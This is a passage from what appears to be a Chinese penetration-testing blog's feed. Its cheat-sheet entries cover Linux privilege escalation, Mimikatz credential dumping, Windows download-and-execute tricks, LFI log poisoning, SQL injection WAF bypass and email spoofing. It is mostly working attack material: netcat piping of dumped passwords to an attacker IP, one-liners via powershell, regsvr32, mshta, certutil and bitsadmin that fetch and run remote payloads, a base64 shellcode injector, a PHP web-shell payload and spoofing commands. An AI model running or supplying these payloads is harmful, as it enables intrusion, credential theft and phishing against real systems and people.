/var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/文件挂载 mount df -h cat /etc/fstabFind命令 find / -perm -1000 -type d 2&gt;/dev/null # 只有目录所有者才可以更改删除 find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息 寻找可写目录 find / -writable -type d 2&gt;/dev/null # 可写目录 find / -perm -222 -type d 2&gt;/dev/null # 可写目录 find / -perm -o w -type d 2&gt;/dev/null # 可写目录 find / -perm -o x -type d 2&gt;/dev/null # 可执行目录 find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null # 可写可执行目录查找文件 find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2&gt;/dev/null # 可写文件 find / dir -xdev \( -nouser -o -nogroup \) -print 2&gt;/dev/null # 无所有者文件0x05 准备及攻击查看语言支持 find / -name perl* find / -name python* find / -name gcc* find / -name cc查看上传方式 find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp寻找exp http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules/ http://securityreason.com http://seclists.org/fulldisclosure/ http://www.google.com编译exp which gcc gcc exp.c -o exp运行 chmod +x exp ./exp0x06 提权辅助脚本 LinEnum linuxprivchecker.py]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Mimikatz 使用Tips]]></title>
    <url>%2Farchives%2Fe83f08e9.html</url>
    <content type="text"><![CDATA[Mimikatz 使用Tips1.记录 Mimikatz输出：C:\&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir2.将输出导入到本地文件：C:\&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt3.将输出传输到远程机器：Attacker执行: E:\&gt;nc -lvp 4444Victim执行: C:\&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit | nc.exe -vv 192.168.52.1 4444192.168.52.1 为Attacker IP 4.通过nc远程执行Mimikatz：Victim执行: C:\&gt;nc -lvp 443Attacker执行: E:\&gt;nc.exe -vv 192.168.52.128 443 -e mimikatz.exe192.168.52.128 为Victim IP 5.hash传递Privilege::debug sekurlsa::pth /domain:xxxx /user:xxxxx /ntlm:xxxxxx之后会弹出cmd。 6.获得PPTP口令mimikatz.exe privilege::debug token::elevate lsadump::secrets exit]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Windows命令执行漏洞技巧]]></title>
    <url>%2Farchives%2Fd7cf94f6.html</url>
    <content type="text"><![CDATA[经常有小伙伴碰到了命令执行漏洞不会玩，比如mssql注入点的命令执行，怎么来获取一个meterpreter？这个时候，就需要想办法来获取了，关于命令行来执行远程命令的方法碰到很多，但是用的时候老会记不起来，所以在这里把碰到的作为一个总结，没准那种方法能帮到你。（当然，我们这里不说可以直接echo webshell的情形） 1、powershelleg: powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz2、regsvr32regsvr32 /u /s /i:http://site.com/js.png scrobj.dlljs.png&lt;?XML version=&quot;1.0&quot;?&gt; &lt;scriptlet&gt; &lt;registration progid=&quot;ShortJSRAT&quot; classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language=&quot;JScript&quot;&gt; &lt;![CDATA[ ps = &quot;cmd.exe /c calc.exe&quot;; new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true); ]]&gt; &lt;/script&gt; &lt;/registration&gt; &lt;/scriptlet&gt;rundll32eg: rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}%细节:https://github.com/3gstudent/Javascript-Backdoor mshta1） mshta http://site.com/calc.hta 2） mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))calc.hta&lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;calc.exe&quot; self.close &lt;/script&gt; &lt;body&gt; demo &lt;/body&gt; &lt;/HEAD&gt; &lt;/HTML&gt;pubprn.vbscscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct6、bitsadmineg: cmd.exe /c bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe7、python（需安装）eg: python -c &quot;import urllib2; exec urllib2.urlopen(&apos;http://site.com/abc&apos;).read();&quot; abc import base64; exec base64.b64decode(&quot;aW1wb3J0IGN0eXBlcwppbXBvcnQgcGxhdGZvcm0KCihhcmNoLCB0eXBlKSA9IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpCgojIDMyLWJpdCBQeXRob24KaWYgYXJjaCA9PSAiMzJiaXQiOgoJc2hlbGxjb2RlID0gIlx4ZmNceGU4XHg4OVx4MDBceDAwXHgwMFx4NjBceDg5XHhlNVx4MzFceGQyXHg2NFx4OGJceDUyXHgzMFx4OGJceDUyXHgwY1x4OGJceDUyXHgxNFx4OGJceDcyXHgyOFx4MGZceGI3XHg0YVx4MjZceDMxXHhmZlx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4YzFceGNmXHgwZFx4MDFceGM3XHhlMlx4ZjBceDUyXHg1N1x4OGJceDUyXHgxMFx4OGJceDQyXHgzY1x4MDFceGQwXHg4Ylx4NDBceDc4XHg4NVx4YzBceDc0XHg0YVx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4OGJceDU4XHgyMFx4MDFceGQzXHhlM1x4M2NceDQ5XHg4Ylx4MzRceDhiXHgwMVx4ZDZceDMxXHhmZlx4MzFceGMwXHhhY1x4YzFceGNmXHgwZFx4MDFceGM3XHgzOFx4ZTBceDc1XHhmNFx4MDNceDdkXHhmOFx4M2JceDdkXHgyNFx4NzVceGUyXHg1OFx4OGJceDU4XHgyNFx4MDFceGQzXHg2Nlx4OGJceDBjXHg0Ylx4OGJceDU4XHgxY1x4MDFceGQzXHg4Ylx4MDRceDhiXHgwMVx4ZDBceDg5XHg0NFx4MjRceDI0XHg1Ylx4NWJceDYxXHg1OVx4NWFceDUxXHhmZlx4ZTBceDU4XHg1Zlx4NWFceDhiXHgxMlx4ZWJceDg2XHg1ZFx4NjhceDZlXHg2NVx4NzRceDAwXHg2OFx4NzdceDY5XHg2ZVx4NjlceDU0XHg2OFx4NGNceDc3XHgyNlx4MDdceGZmXHhkNVx4ZThceDgwXHgwMFx4MDBceDAwXHg0ZFx4NmZceDdhXHg2OVx4NmNceDZjXHg2MVx4MmZceDM1XHgyZVx4MzBceDIwXHgyOFx4NjNceDZmXHg2ZFx4NzBceDYxXHg3NFx4NjlceDYyXHg2Y1x4NjVceDNiXHgyMFx4NGRceDUzXHg0OVx4NDVceDIwXHgzOVx4MmVceDMwXHgzYlx4MjBceDU3XHg2OVx4NmVceDY0XHg2Zlx4NzdceDczXHgyMFx4NGVceDU0XHgyMFx4MzZceDJlXHgzMVx4M2JceDIwXHg1N1x4NGZceDU3XHgzNlx4MzRceDNiXHgyMFx4NTRceDcyXHg2OVx4NjRceDY1XHg2ZVx4NzRceDJmXHgzNVx4MmVceDMwXHgzYlx4MjBceDQyXHg0Zlx4NDlceDQ1XHgzOVx4M2JceDQ1XHg0ZVx4NTVceDUzXHg0ZFx4NTNceDQ1XHgyOVx4MDBceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4MDBceDU5XHgzMVx4ZmZceDU3XHg1N1x4NTdceDU3XHg1MVx4NjhceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3OVx4NWJceDMxXHhjOVx4NTFceDUxXHg2YVx4MDNceDUxXHg1MVx4NjhceGI4XHgyMlx4MDBceDAwXHg1M1x4NTBceDY4XHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NjJceDU5XHgzMVx4ZDJceDUyXHg2OFx4MDBceDAyXHg2MFx4ODRceDUyXHg1Mlx4NTJceDUxXHg1Mlx4NTBceDY4XHhlYlx4NTVceDJlXHgzYlx4ZmZceGQ1XHg4OVx4YzZceDMxXHhmZlx4NTdceDU3XHg1N1x4NTdceDU2XHg2OFx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHg3NFx4NDRceDMxXHhmZlx4ODVceGY2XHg3NFx4MDRceDg5XHhmOVx4ZWJceDA5XHg2OFx4YWFceGM1XHhlMlx4NWRceGZmXHhkNVx4ODlceGMxXHg2OFx4NDVceDIxXHg1ZVx4MzFceGZmXHhkNVx4MzFceGZmXHg1N1x4NmFceDA3XHg1MVx4NTZceDUwXHg2OFx4YjdceDU3XHhlMFx4MGJceGZmXHhkNVx4YmZceDAwXHgyZlx4MDBceDAwXHgzOVx4YzdceDc0XHhiY1x4MzFceGZmXHhlYlx4MTVceGViXHg0OVx4ZThceDk5XHhmZlx4ZmZceGZmXHgyZlx4NTJceDYyXHg0Nlx4NjJceDAwXHgwMFx4NjhceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDZhXHg0MFx4NjhceDAwXHgxMFx4MDBceDAwXHg2OFx4MDBceDAwXHg0MFx4MDBceDU3XHg2OFx4NThceGE0XHg1M1x4ZTVceGZmXHhkNVx4OTNceDUzXHg1M1x4ODlceGU3XHg1N1x4NjhceDAwXHgyMFx4MDBceDAwXHg1M1x4NTZceDY4XHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg4NVx4YzBceDc0XHhjZFx4OGJceDA3XHgwMVx4YzNceDg1XHhjMFx4NzVceGU1XHg1OFx4YzNceGU4XHgzN1x4ZmZceGZmXHhmZlx4MzFceDMwXHgzM1x4MmVceDMyXHgzM1x4MzhceDJlXHgzMlx4MzJceDM1XHgyZVx4MzFceDMyXHgzOVx4MDAiCgojIDY0LWJpdCBQeXRob24KZWxpZiBhcmNoID09ICI2NGJpdCI6CglzaGVsbGNvZGUgPSAiXHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjOFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDY2XHg4MVx4NzhceDE4XHgwYlx4MDJceDc1XHg3Mlx4OGJceDgwXHg4OFx4MDBceDAwXHgwMFx4NDhceDg1XHhjMFx4NzRceDY3XHg0OFx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4NDRceDhiXHg0MFx4MjBceDQ5XHgwMVx4ZDBceGUzXHg1Nlx4NDhceGZmXHhjOVx4NDFceDhiXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4XHgzMVx4YzBceGFjXHg0MVx4YzFceGM5XHgwZFx4NDFceDAxXHhjMVx4MzhceGUwXHg3NVx4ZjFceDRjXHgwM1x4NGNceDI0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceDQxXHg1YVx4NDhceDgzXHhlY1x4MjBceDQxXHg1Mlx4ZmZceGUwXHg1OFx4NDFceDU5XHg1YVx4NDhceDhiXHgxMlx4ZTlceDRmXHhmZlx4ZmZceGZmXHg1ZFx4NmFceDAwXHg0OVx4YmVceDc3XHg2OVx4NmVceDY5XHg2ZVx4NjVceDc0XHgwMFx4NDFceDU2XHg0OVx4ODlceGU2XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceGU4XHg4MFx4MDBceDAwXHgwMFx4NGRceDZmXHg3YVx4NjlceDZjXHg2Y1x4NjFceDJmXHgzNVx4MmVceDMwXHgyMFx4MjhceDYzXHg2Zlx4NmRceDcwXHg2MVx4NzRceDY5XHg2Mlx4NmNceDY1XHgzYlx4MjBceDRkXHg1M1x4NDlceDQ1XHgyMFx4MzlceDJlXHgzMFx4M2JceDIwXHg1N1x4NjlceDZlXHg2NFx4NmZceDc3XHg3M1x4MjBceDRlXHg1NFx4MjBceDM2XHgyZVx4MzFceDNiXHgyMFx4NTdceDRmXHg1N1x4MzZceDM0XHgzYlx4MjBceDU0XHg3Mlx4NjlceDY0XHg2NVx4NmVceDc0XHgyZlx4MzVceDJlXHgzMFx4M2JceDIwXHg0Mlx4NGZceDQ5XHg0NVx4MzlceDNiXHg0NVx4NGVceDU1XHg1M1x4NGRceDUzXHg0NVx4MjlceDAwXHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDAwXHg1OVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NDFceDUwXHg0MVx4NTBceDQxXHhiYVx4M2FceDU2XHg3OVx4YTdceGZmXHhkNVx4ZWJceDYxXHg1YVx4NDhceDg5XHhjMVx4NDFceGI4XHhiOFx4MjJceDAwXHgwMFx4NGRceDMxXHhjOVx4NDFceDUxXHg0MVx4NTFceDZhXHgwM1x4NDFceDUxXHg0MVx4YmFceDU3XHg4OVx4OWZceGM2XHhmZlx4ZDVceGViXHg0NFx4NDhceDg5XHhjMVx4NDhceDMxXHhkMlx4NDFceDU4XHg0ZFx4MzFceGM5XHg1Mlx4NjhceDAwXHgwMlx4NjBceDg0XHg1Mlx4NTJceDQxXHhiYVx4ZWJceDU1XHgyZVx4M2JceGZmXHhkNVx4NDhceDg5XHhjNlx4NmFceDBhXHg1Zlx4NDhceDg5XHhmMVx4NDhceDMxXHhkMlx4NGRceDMxXHhjMFx4NGRceDMxXHhjOVx4NTJceDUyXHg0MVx4YmFceDJkXHgwNlx4MThceDdiXHhmZlx4ZDVceDg1XHhjMFx4NzVceDFkXHg0OFx4ZmZceGNmXHg3NFx4MTBceGViXHhkZlx4ZWJceDYzXHhlOFx4YjdceGZmXHhmZlx4ZmZceDJmXHg2Ylx4NTRceDQ4XHg1Nlx4MDBceDAwXHg0MVx4YmVceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDQ4XHgzMVx4YzlceGJhXHgwMFx4MDBceDQwXHgwMFx4NDFceGI4XHgwMFx4MTBceDAwXHgwMFx4NDFceGI5XHg0MFx4MDBceDAwXHgwMFx4NDFceGJhXHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg0OFx4OTNceDUzXHg1M1x4NDhceDg5XHhlN1x4NDhceDg5XHhmMVx4NDhceDg5XHhkYVx4NDFceGI4XHgwMFx4MjBceDAwXHgwMFx4NDlceDg5XHhmOVx4NDFceGJhXHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg0OFx4ODNceGM0XHgyMFx4ODVceGMwXHg3NFx4YjZceDY2XHg4Ylx4MDdceDQ4XHgwMVx4YzNceDg1XHhjMFx4NzVceGQ3XHg1OFx4NThceGMzXHhlOFx4MzVceGZmXHhmZlx4ZmZceDMxXHgzMFx4MzNceDJlXHgzMlx4MzNceDM4XHgyZVx4MzJceDMyXHgzNVx4MmVceDMxXHgzMlx4MzlceDAwIiAKZWxzZToKCXNoZWxsY29kZSA9ICIiCgojIHNhbml0eSBjaGVjayBvdXIgc2l0dWF0aW9uCmlmIHR5cGUgIT0gIldpbmRvd3NQRSIgb3IgbGVuKHNoZWxsY29kZSkgPT0gMDoKCXF1aXQoKQoKIyBpbmplY3Qgb3VyIHNoZWxsY29kZQpyd3hwYWdlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoMCwgbGVuKHNoZWxsY29kZSksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgcnd4cGFnZSwgMCwgMCwgMCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwgLTEpCg==&quot;)8、certutileg: certutil -urlcache -split -f http://site.com/a a.exe &amp;&amp; a.exe &amp;&amp; del a.exe &amp;&amp; certutil -urlcache -split -f http://192.168.254.102:80/a delete9、msiexecmsiexec /q /i http://site.com/payloads/calc.pngcalc.pngmsfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.png10、msxsl.exe(需下载)eg: msxsl https://evi1cg.github.io/scripts/demo.xml https://evi1cg.github.io/scripts/exec.xsl demo.xml &lt;?xml version=&quot;1.0&quot;?&gt; &lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt; &lt;customers&gt; &lt;customer&gt; &lt;name&gt;Microsoft&lt;/name&gt; &lt;/customer&gt; &lt;/customers&gt; exec.xsl &lt;?xml version=&apos;1.0&apos;?&gt; &lt;xsl:stylesheet version=&quot;1.0&quot; xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt; &lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt; function xml(nodelist) { var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;); return nodelist.nextNode().xml; } &lt;/msxsl:script&gt; &lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt;11、IEExeceg: C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; caspol -s off C:\Windows\Microsoft.NET\Framework\v2.0.50727\&gt; IEExec http://site.com/files/test64.exe 细节：戳我 12、IEXPLORE.EXE这个需要IE存在可执行命令的漏洞eg: &quot;C:\Program Files\Internet Explorer\IEXPLORE.EXE&quot; http://site.com/expexp可以使用类似ms14_064 13、当使用UNC/WebDAV时候多的几种姿势Cmd cmd.exe /k &lt; \\webdavserver\folder\batchfile.txt Cscript/Wscript cscript //E:jscript \\webdavserver\folder\payload.txt Regasm/RegsvcC:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \webdavserver\folder\payload.dlldll 可以使用C#写的 Msbuildcmd /V /c &quot;set MB=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot; &amp; !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml &gt; payload.xml &amp; !MB! payload.xml&quot; pcalua.exe pcalua.exe -a \\server\payload.dll联想: GreatSct_Win应用程序白名单bypass工具]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>命令执行</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LFI_SSH日志]]></title>
    <url>%2Farchives%2F8946a683.html</url>
    <content type="text"><![CDATA[登陆SSH：ssh &apos;&lt;?php system($_GET[‘c’]); ?&gt;&apos;@192.168.1.105包含文件：http://192.168.1.105/lfi/lfi.php?file=/var/log/auth.log&amp;c=ls/var/log/auth.log只有ubuntu系有。 其实对linux，可以包含/var/log/wtmp。一样的效果。有16字符可控，足够了。 只可以没有x权限，要不然ssrf fastcgi就有意思了。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[WAF是如何被绕过的？SQL注入常见手法解密。]]></title>
    <url>%2Farchives%2F7bcebf52.html</url>
    <content type="text"><![CDATA[常见的关系型数据库有mysql、SQL Server、Oracle、Sybase、DB2等。sql语句标准语句写法相同，但由于不同数据库都有自己专用函数，因此过滤的规则可能也有所不同。因常见数据库都为mysql，因此以下以mysql数据库标准语句举例： 关键字：and,or,select,update,delete,create,union,insert,net,truncate,exec,drop,declare,count,chr,mid,master,char,Sp_sqlexec,order by,where,limit等关键字符：&quot; &apos; &quot;(单引号)、&quot; &lt; &quot;（小于号）、&quot; &gt; &quot;(大于号)、&quot; ; &quot;(冒号)、&quot; ( &quot;(括号)、&quot; ) &quot;（括号）、&quot; * &quot;(星号)、&quot; % &quot;(百分号)、&quot; &quot;（空格）、&quot; -- &quot;(sql中的注释符)、&quot;#&quot;等sql绕过方法大全：1、大小写绕过例如And、anD2、编码绕过例如%55nIon(union)、%53elect(select)【url编码绕过、十六进制编码绕过、unicode编码绕过】3、特殊字符转换例如and可替换为&amp;&amp;、or可替换为||、空格过滤转换为%0a,+,或者/**/,%20,%09,%0b,%0c,%0d,%a0、“=”转换为like,greatest,between4、注释绕过例如un/**/ion、se/**/lect （常用注释符：//,-- ,/**/, #,--+,-- -,;--a ），内联注释绕过、/*!UNION*/5、等价函数与命令有些函数或命令因其关键字被检测出来而无法使用但是在很多情况下可以使用与之等价或类似的代码替代其使用 例如：hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir()6、使用一些特殊字符也可对其进行绕过，例如：`、~、!、@、()、[]、.、-、+ 、|、%00，举例关键字拆分：&apos;se&apos;+&apos;lec&apos;+&apos;t&apos;、(SeL)(EcT)等7、http参数控制HPP(HTTP Parameter Polution)又称做重复参数污染最简单的就是?uid=1&amp;uid=2&amp;uid=3对于这种情况不同的Web服务器处理方式不一样 举例：/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users8、缓冲区溢出举例?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 示例0xA*1000指0xA后面”A&quot;重复1000次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里1000只做参考也许在有些情况下可能不需要这么长也能溢出9、整合绕过整合的意思是结合使用前面谈到的各种绕过技术单一的技术可能无法绕过过滤机制但是多种技术的配合使用成功的可能性就会增加不少了 举例： id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - 即： 注释+大小写+特殊字符绕过复杂的SQL注入常见手大体如此，WAF是如何被绕过的？这样就清楚了。那么我们在开发中，如何防止SQL注入，如何防止waf防绕过，心中也就有些眉目，就知道该如何应对了。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>Waf特性</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[邮箱伪造]]></title>
    <url>%2Farchives%2F368c71e.html</url>
    <content type="text"><![CDATA[钓鱼邮件初探：黑客是如何进行邮件伪造的？ 现如今的钓鱼邮件都是通过注册相似的邮箱，或者设置邮箱的显示名称，盼着被害人有看走眼的那一刻，轻信邮件的内容。这种方法需要一定的社工技巧，以及诱导性的语言来诱使被害人上钩。但是对于有一定的经验以及眼力的人来说，还是可以识破骗子的伎俩。 下面我要介绍的这款工具可以最大程度的欺骗你的邮箱，更不要提你的眼睛。当然，此方法不是适用于任何邮箱，毕竟每种邮箱的过滤机制都不相同。gmail在这方面就做的不错。 Swaks - SMTP界的瑞士军刀基本用法： swaks –to &lt;要测试的邮箱&gt; 用来测试邮箱的连通性 root@kali:~# swaks --to xxxx@qq.com === Trying mx3.qq.com:25... === Connected to mx3.qq.com. &lt;- 220 newmx59.qq.com MX QQ Mail Server -&gt; EHLO kali &lt;- 250-newmx59.qq.com &lt;- 250-SIZE 73400320 &lt;- 250-STARTTLS &lt;- 250 OK -&gt; MAIL FROM:&lt;root@kali&gt; &lt;- 250 Ok -&gt; RCPT TO:&lt;xxxx@qq.com&gt; &lt;- 250 Ok -&gt; DATA &lt;- 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; -&gt; Date: Tue, 05 Jan 2016 23:15:11 -0500 -&gt; To: xxxx@qq.com -&gt; From: root@kali -&gt; Subject: test Tue, 05 Jan 2016 23:15:11 -0500 -&gt; X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/ -&gt; -&gt; This is a test mailing -&gt; -&gt; . &lt;** 550 Mail content denied. http://service.mail.qq.com/cgi-bin/help?subtype=1&amp;&amp;id=20022&amp;&amp;no=1000726 -&gt; QUIT &lt;- 221 Bye === Connection closed with remote host.前面都返回250ok，说明该邮箱存在，并且可以正常收信。最后可以看到qq邮箱返回550错误，qq官方给出的出错原因：该邮件内容涉嫌大量群发，并且被多数用户投诉为垃圾邮件。 我们可以继续对邮件进行伪造，来绕过qq邮箱的判断 比如： swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot;其中： –from &lt;要显示的发件人邮箱&gt; –ehlo &lt;伪造的邮件ehlo头&gt; –body &lt;邮件正文&gt; –header &lt;邮件头信息，subject为邮件标题&gt;在你ip没有被qq邮箱band的情况下，邮件可以正常发送，返回250 ok。 高级用法：使用swaks其实还可以进行更高级的邮件伪造，几乎可以伪造邮件中的每一个参数。 –data &lt;源邮件&gt; 首先，我们需要一份正常的邮件 M亲测可用的伪造邮箱方法 swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot; swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot; swaks --to xxxx@qq.com --from info@freebuf.com --ehlo freebuf.com --body hello --header &quot;Subject: hello&quot;]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>知识科普</tag>
        <tag>奇淫技巧</tag>
        <tag>社工</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Thinkphp_漏洞列表]]></title>
    <url>%2Farchives%2Ff1b53e95.html</url>
    <content type="text"><![CDATA[Thinkphp-漏洞列表:`https://github.com/Maikefee/pochubs`Thinkphp3.2.3最新版update注入漏洞`https://www.anquanke.com/post/id/104847`ThinkPHP5.0.10-3.2.3缓存函数设计缺陷可导致Getshell:https://xz.aliyun.com/t/99]]></content>
      <categories>
        <category>渗透测试</category>
        <category>漏洞挖掘</category>
        <category>常见Cms漏洞</category>
      </categories>
  </entry>
  <entry>
